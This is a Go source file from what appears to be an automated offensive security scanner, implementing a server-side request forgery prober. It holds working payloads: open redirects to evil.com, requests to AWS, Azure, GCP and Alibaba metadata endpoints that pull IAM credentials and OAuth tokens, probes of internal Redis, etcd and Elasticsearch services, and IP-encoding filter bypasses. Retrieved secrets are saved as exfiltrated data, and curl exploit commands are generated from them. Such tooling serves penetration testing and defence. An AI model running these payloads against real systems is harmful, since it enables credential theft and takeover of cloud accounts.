package probers

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// SSRFProber tests for Server-Side Request Forgery vulnerabilities.
type SSRFProber struct{}

func (p *SSRFProber) Name() string { return "ssrf" }

func (p *SSRFProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	if currentClassified != nil {
		cfg.Classified = currentClassified
	}
	var findings []types.Finding

	findings = append(findings, p.testOpenRedirect(cfg)...)
	findings = append(findings, p.testSSRFViaURLParams(cfg, endpoints)...)

	return findings
}

func (p *SSRFProber) testOpenRedirect(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.Classified == nil {
		return findings
	}

	redirectPayloads := []struct {
		target string
		desc   string
	}{
		{"https://evil.com", "external URL redirect"},
		{"//evil.com", "protocol-relative redirect"},
	}

	for _, ep := range cfg.Classified.Redirect {
		path := extractPath(ep.URL)
		baseEndpoint := strings.Split(ep.URL, "?")[0]

		redirectParams := []string{"to", "url", "redirect", "target", "next", "return",
			"returnto", "return_to", "redirect_uri", "continue"}
		paramToTest := ""
		for _, p := range ep.Parameters {
			for _, rp := range redirectParams {
				if strings.EqualFold(p, rp) {
					paramToTest = p
					break
				}
			}
			if paramToTest != "" {
				break
			}
		}
		if paramToTest == "" {
			paramToTest = "to"
		}

		for _, rp := range redirectPayloads {
			encoded := url.QueryEscape(rp.target)
			fullURL := fmt.Sprintf("%s?%s=%s", baseEndpoint, paramToTest, encoded)
			status, headers, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
			if err != nil {
				continue
			}

			location := headers.Get("Location")
			if status >= 300 && status < 400 && location != "" {
				findings = append(findings, MakeFinding(
					fmt.Sprintf("Open Redirect - %s", rp.desc),
					"Medium",
					fmt.Sprintf("The redirect endpoint allows redirection to arbitrary URLs: %s", rp.target),
					path+"?"+paramToTest+"=",
					"GET",
					"CWE-601",
					fmt.Sprintf(`curl -I "%s"`, fullURL),
					fmt.Sprintf("HTTP %d - Location: %s", status, location),
					"ssrf",
					0,
				))
				return findings
			} else if status == 200 {
				findings = append(findings, MakeFinding(
					fmt.Sprintf("Open Redirect/SSRF - %s", rp.desc),
					"Medium",
					fmt.Sprintf("The redirect endpoint processes URL: %s and returns content.", rp.target),
					path+"?"+paramToTest+"=",
					"GET",
					"CWE-601",
					fmt.Sprintf(`curl "%s"`, fullURL),
					fmt.Sprintf("HTTP %d - Response: %s", status, truncate(respBody, 200)),
					"ssrf",
					0,
				))
				return findings
			}
		}
	}

	return findings
}

func (p *SSRFProber) testSSRFViaURLParams(cfg *ProberConfig, endpoints []types.Endpoint) []types.Finding {
	var findings []types.Finding

	// URL-accepting parameter names
	urlParams := []string{"url", "imageurl", "image_url", "src", "href", "link",
		"callback", "uri", "endpoint", "dest", "target", "fetch", "proxy",
		"load", "page", "feed", "host", "site", "path", "file", "document",
		"folder", "next", "data", "reference", "ref"}

	// Cloud metadata endpoints — the real exploit targets
	cloudMetadata := []struct {
		url       string
		desc      string
		evidence  []string
		followUp  []string // Additional paths to try if initial probe succeeds
		severity  string
	}{
		{
			"http://169.254.169.254/latest/meta-data/",
			"AWS EC2 Instance Metadata",
			[]string{"ami-id", "instance-id", "hostname", "local-ipv4", "security-credentials", "iam"},
			[]string{
				"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
				"http://169.254.169.254/latest/meta-data/hostname",
				"http://169.254.169.254/latest/meta-data/local-ipv4",
				"http://169.254.169.254/latest/user-data",
				"http://169.254.169.254/latest/dynamic/instance-identity/document",
			},
			"Critical",
		},
		{
			"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
			"Azure Instance Metadata (IMDS)",
			[]string{"compute", "vmId", "subscriptionId", "resourceGroupName", "location"},
			[]string{
				"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
			},
			"Critical",
		},
		{
			"http://metadata.google.internal/computeMetadata/v1/?recursive=true",
			"GCP Instance Metadata",
			[]string{"instance", "project", "zone", "machineType", "serviceAccounts"},
			[]string{
				"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
				"http://metadata.google.internal/computeMetadata/v1/project/project-id",
			},
			"Critical",
		},
		{
			"http://100.100.100.200/latest/meta-data/",
			"Alibaba Cloud Metadata",
			[]string{"instance-id", "region-id", "hostname"},
			nil,
			"Critical",
		},
		{
			"http://169.254.170.2/v2/credentials/",
			"AWS ECS Task Metadata",
			[]string{"AccessKeyId", "SecretAccessKey", "Token", "RoleArn"},
			nil,
			"Critical",
		},
	}

	// Internal service probes
	internalTargets := []struct {
		url      string
		desc     string
		evidence []string
		severity string
	}{
		{"http://localhost/", "Localhost access", nil, "High"},
		{"http://127.0.0.1/", "Loopback access", nil, "High"},
		{"http://[::1]/", "IPv6 loopback", nil, "High"},
		{"http://localhost:6379/INFO", "Redis (port 6379)", []string{"redis_version", "connected_clients"}, "Critical"},
		{"http://localhost:11211/stats", "Memcached (port 11211)", []string{"STAT", "bytes"}, "Critical"},
		{"http://localhost:9200/", "Elasticsearch (port 9200)", []string{"cluster_name", "lucene_version"}, "Critical"},
		{"http://localhost:5984/_all_dbs", "CouchDB (port 5984)", []string{"_users", "_replicator"}, "Critical"},
		{"http://localhost:8500/v1/agent/self", "Consul (port 8500)", []string{"Config", "Member"}, "High"},
		{"http://localhost:2379/version", "etcd (port 2379)", []string{"etcdserver", "etcdcluster"}, "Critical"},
	}

	// SSRF bypass techniques
	bypassPayloads := []struct {
		url  string
		desc string
	}{
		{"http://0x7f000001/", "hex IP bypass"},
		{"http://0177.0.0.1/", "octal IP bypass"},
		{"http://2130706433/", "decimal IP bypass"},
		{"http://127.1/", "short form bypass"},
		{"http://0/", "zero IP bypass"},
		{"http://localtest.me/", "DNS rebinding (localtest.me)"},
		{"http://spoofed.burpcollaborator.net/", "DNS rebinding"},
	}

	for _, ep := range endpoints {
		if ep.HasCategory(types.CatStatic) {
			continue
		}

		for _, param := range ep.Parameters {
			lowerParam := strings.ToLower(param)
			isURLParam := false
			for _, up := range urlParams {
				if lowerParam == up {
					isURLParam = true
					break
				}
			}
			if !isURLParam {
				continue
			}

			path := extractPath(ep.URL)
			baseEndpoint := strings.Split(ep.URL, "?")[0]

			// === PHASE 1: Cloud metadata exploitation ===
			for _, cm := range cloudMetadata {
				result := p.trySSRF(cfg, baseEndpoint, param, cm.url)
				if result == nil {
					continue
				}

				hasEvidence := false
				lowerResp := strings.ToLower(result.body)
				for _, ev := range cm.evidence {
					if strings.Contains(lowerResp, strings.ToLower(ev)) {
						hasEvidence = true
						break
					}
				}

				if !hasEvidence && result.status != 200 {
					continue
				}

				// SUCCESS — we can reach cloud metadata!
				evidence := fmt.Sprintf("HTTP %d - %s\nResponse: %s", result.status, cm.desc, truncate(result.body, 500))

				// Follow-up: try to extract credentials
				var exfiltrated []string
				if cm.followUp != nil {
					for _, followURL := range cm.followUp {
						fr := p.trySSRF(cfg, baseEndpoint, param, followURL)
						if fr != nil && fr.status == 200 && len(fr.body) > 5 {
							exfiltrated = append(exfiltrated, fmt.Sprintf("[%s]\n%s", followURL, truncate(fr.body, 300)))
						}
					}
				}

				poc := fmt.Sprintf("# Cloud metadata SSRF exploit:\ncurl \"%s?%s=%s\"\n",
					baseEndpoint, param, url.QueryEscape(cm.url))
				if len(cm.followUp) > 0 {
					poc += "\n# Credential extraction:\n"
					for _, fu := range cm.followUp {
						poc += fmt.Sprintf("curl \"%s?%s=%s\"\n", baseEndpoint, param, url.QueryEscape(fu))
					}
				}

				f := MakeFinding(
					fmt.Sprintf("SSRF — %s via %s parameter", cm.desc, param),
					cm.severity,
					fmt.Sprintf("Server-side request forgery allows access to %s. An attacker can extract cloud credentials, instance identity, and potentially escalate to full cloud account compromise.", cm.desc),
					path,
					result.method,
					"CWE-918",
					poc,
					evidence,
					"ssrf",
					0,
				)
				if len(exfiltrated) > 0 {
					f.ExfiltratedData = strings.Join(exfiltrated, "\n\n")
				}
				findings = append(findings, f)
				return findings // One critical SSRF is enough
			}

			// === PHASE 2: Internal service probing ===
			for _, it := range internalTargets {
				result := p.trySSRF(cfg, baseEndpoint, param, it.url)
				if result == nil || result.status == 0 {
					continue
				}

				hasEvidence := len(it.evidence) == 0 && result.status == 200
				if !hasEvidence {
					lowerResp := strings.ToLower(result.body)
					for _, ev := range it.evidence {
						if strings.Contains(lowerResp, strings.ToLower(ev)) {
							hasEvidence = true
							break
						}
					}
				}

				if !hasEvidence {
					continue
				}

				findings = append(findings, MakeFinding(
					fmt.Sprintf("SSRF — %s accessible via %s parameter", it.desc, param),
					it.severity,
					fmt.Sprintf("Server-side request forgery allows access to internal service: %s", it.desc),
					path,
					result.method,
					"CWE-918",
					fmt.Sprintf(`curl "%s?%s=%s"`, baseEndpoint, param, url.QueryEscape(it.url)),
					fmt.Sprintf("HTTP %d - %s: %s", result.status, it.desc, truncate(result.body, 300)),
					"ssrf",
					0,
				))
			}

			// === PHASE 3: Filter bypass attempts ===
			// Only try if direct SSRF didn't work
			if len(findings) == 0 {
				for _, bp := range bypassPayloads {
					result := p.trySSRF(cfg, baseEndpoint, param, bp.url)
					if result != nil && result.status == 200 && len(result.body) > 20 {
						findings = append(findings, MakeFinding(
							fmt.Sprintf("SSRF Filter Bypass — %s via %s parameter", bp.desc, param),
							"High",
							fmt.Sprintf("SSRF protection bypass using %s technique. The server fetches content from %s.", bp.desc, bp.url),
							path,
							result.method,
							"CWE-918",
							fmt.Sprintf(`curl "%s?%s=%s"`, baseEndpoint, param, url.QueryEscape(bp.url)),
							fmt.Sprintf("HTTP %d - Bypass: %s\nResponse: %s", result.status, bp.desc, truncate(result.body, 200)),
							"ssrf",
							0,
						))
						break // One bypass proof is enough
					}
				}
			}
		}
	}

	return findings
}

type ssrfResult struct {
	status int
	body   string
	method string
}

func (p *SSRFProber) trySSRF(cfg *ProberConfig, baseEndpoint, param, targetURL string) *ssrfResult {
	// Try GET
	encoded := url.QueryEscape(targetURL)
	fullURL := fmt.Sprintf("%s?%s=%s", baseEndpoint, param, encoded)
	status, _, body, err := cfg.DoRequest("GET", fullURL, nil, nil)
	if err == nil && status == 200 && len(body) > 5 {
		return &ssrfResult{status: status, body: body, method: "GET"}
	}

	// Try POST with form data
	formData := fmt.Sprintf("%s=%s", param, encoded)
	s2, _, b2, e2 := cfg.DoRequest("POST", baseEndpoint,
		strings.NewReader(formData),
		map[string]string{"Content-Type": "application/x-www-form-urlencoded"})
	if e2 == nil && s2 == 200 && len(b2) > 5 {
		return &ssrfResult{status: s2, body: b2, method: "POST"}
	}

	// Try POST with JSON
	jsonData := fmt.Sprintf(`{"%s":"%s"}`, param, targetURL)
	s3, _, b3, e3 := cfg.DoRequest("POST", baseEndpoint,
		strings.NewReader(jsonData),
		map[string]string{"Content-Type": "application/json"})
	if e3 == nil && s3 == 200 && len(b3) > 5 {
		return &ssrfResult{status: s3, body: b3, method: "POST"}
	}

	return nil
}
